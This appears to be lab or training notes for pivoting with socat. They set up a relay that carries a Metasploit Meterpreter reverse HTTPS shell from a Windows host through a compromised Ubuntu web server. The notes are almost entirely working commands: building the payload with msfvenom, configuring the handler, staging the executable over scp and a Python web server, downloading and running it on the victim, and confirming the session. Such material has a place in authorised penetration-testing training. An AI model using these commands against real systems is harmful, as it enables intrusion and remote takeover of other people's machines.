# Socat Redirection with Reverse Shell

## Socat Listener on Pivot Host

```sh
ubuntu@WEB01:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.15.109:80
```

## Creating the Payload

```sh
my@attack:~$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o shell.exe
```

## Configuring the Handler

```sh
my@attack:~$ sudo msfconsole -q
```

```sh
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 80
msf6 exploit(multi/handler) > run
```

## Payload Transfer

### Uploading

```sh
my@attack:~$ scp shell.exe ubuntu@10.129.15.50:/tmp
```

### Web Server on Pivot Host

```sh
ubuntu@WEB01:~$ python3 -m http.server 8123 -d /tmp
```

### Downloading

```pwsh
PS C:\Users\victor> Invoke-WebRequest -Uri "http://172.16.5.129:8123/shell.exe" -OutFile "shell.exe"
```

### Executing

```pwsh
PS C:\Users\victor> .\shell.exe
```

## Meterpreter Session Established

```sh
meterpreter > getuid
```

```output title="Output"
Server username: INLANEFREIGHT\victor
```
